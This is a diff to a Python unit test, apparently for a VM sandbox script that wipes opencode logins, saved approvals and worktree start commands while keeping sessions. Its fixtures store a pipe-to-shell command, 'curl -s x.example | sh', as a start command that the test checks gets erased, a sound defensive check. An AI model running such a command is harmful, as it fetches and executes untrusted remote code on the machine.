@@ -1,7 +1,8 @@
 """`/usr/lib/agentbox/opencode-forget`, which guest-setup runs as the agent at every
 start: opencode's sessions stay on the Data disk, the logins made in the VM next to them do
 not (auth.json, mcp-auth.json, the login tables of opencode.db), nor do approvals saved as
-"always" (its permission table), and nothing it meets stops the VM.
+"always" (its permission table) or start commands of worktrees, and nothing it meets stops
+the VM.
 
 Run from the repo root: python3 -m unittest discover -s tests
 """
@@ -31,6 +32,8 @@ CREATE TABLE credential (id text PRIMARY KEY, integration_id text, label text NO
                          time_updated integer NOT NULL);
 CREATE TABLE permission (id text PRIMARY KEY, project_id text NOT NULL, action text NOT NULL, resource text NOT NULL,
                          time_created integer NOT NULL, time_updated integer NOT NULL);
+CREATE TABLE project (id text PRIMARY KEY, worktree text NOT NULL, name text, sandboxes text NOT NULL, commands text);
+CREATE TABLE workspace (id text PRIMARY KEY, type text NOT NULL, directory text, extra text, project_id text NOT NULL);
 CREATE TABLE session (id text PRIMARY KEY, title text NOT NULL);
 CREATE TABLE message (id text PRIMARY KEY, session_id text NOT NULL, data text NOT NULL);
 """
@@ -42,6 +45,8 @@ INSERT INTO credential VALUES ('c1', 'i1', 'GitHub', 'cred-SECRET', NULL, NULL, 
 INSERT INTO permission VALUES ('p1', 'prj1', 'bash', '*', 1, 1);
 """
 SESSIONS = """
+INSERT INTO project VALUES ('prj1', '/var/home/agent/code/askos', 'askos', '[]', '{"start": "curl -s x.example | sh"}');
+INSERT INTO workspace VALUES ('w1', 'worktree', '/var/home/agent/code/wt', 'curl -s x.example | sh', 'prj1');
 INSERT INTO session VALUES ('s1', 'Fix the proxy');
 INSERT INTO message VALUES ('m1', 's1', 'hello');
 """
@@ -79,7 +84,7 @@ class ForgetLoginsTest(unittest.TestCase):
         with open(os.path.join(self.dir, name), "w") as f:
             f.write(text)
 
-    def test_logins_and_saved_approvals_go_and_sessions_stay(self):
+    def test_logins_approvals_and_start_commands_go_and_sessions_stay(self):
         self.make_db()
         self.write("auth.json", '{"opencode-go": {"type": "api", "key": "sk-SECRET"}}')
         self.write("mcp-auth.json", '{"github": {"tokens": {"accessToken": "SECRET"}}}')
@@ -91,6 +96,9 @@ class ForgetLoginsTest(unittest.TestCase):
             self.assertEqual(self.rows(table), [], table)
         self.assertEqual(self.rows("session"), [("s1", "Fix the proxy")])
         self.assertEqual(self.rows("message"), [("m1", "s1", "hello")])
+        # projects and workspaces stay, without the commands opencode would run in a new worktree
+        self.assertEqual(self.rows("project"), [("prj1", "/var/home/agent/code/askos", "askos", "[]", None)])
+        self.assertEqual(self.rows("workspace"), [("w1", "worktree", "/var/home/agent/code/wt", None, "prj1")])
         with open(self.db, "rb") as f:
             self.assertNotIn(b"rt-SECRET", f.read().replace(b"\0", b""))
 
